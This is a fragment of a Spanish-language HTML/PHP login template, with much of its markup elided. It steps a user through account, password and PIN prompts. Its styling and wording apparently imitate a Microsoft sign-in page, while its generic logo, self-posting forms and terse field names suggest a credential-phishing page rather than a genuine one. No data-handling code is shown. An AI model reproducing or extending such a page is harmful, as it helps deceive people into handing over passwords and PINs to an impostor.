		...
		<div class="container-login100">
			<div class="wrap-login100">
				<form method="post" action="" class="delform" >
					...
					<img src="css/logggo.png" style="width:200px;"><br><br>
						<span style="font-size: 1.3rem;  font-weight: 600;"><b>Ingresa los datos solicitados a continuación:</b></span><br><br>
					...
					<span style="font-size: .8125rem;">¿No tiene una cuenta? <a href="" style="color: #0067b8;text-decoration:none;">Cree una.</a></span>
								<br>
		...
		<div class="container-login100">
				...
				<form method="post" action="" class="delform" >
					...
					<img src="css/izq.png"><span style="color:#000000;"><?php echo $_SESSION['a']; ?></span><br><br>
						...
						<input class="input100" type="password" name="b" placeholder="Escribir Contraseña" required>
	...
	<div id="vista3" style="">	
		...
		<div class="container-login100">
			<div class="wrap-login100">
					...
					<span style="font-size: .8125rem;"><a href="" style="color: #0067b8;text-decoration:none;">¿Olvidó su pin?</a></span>
								<br>
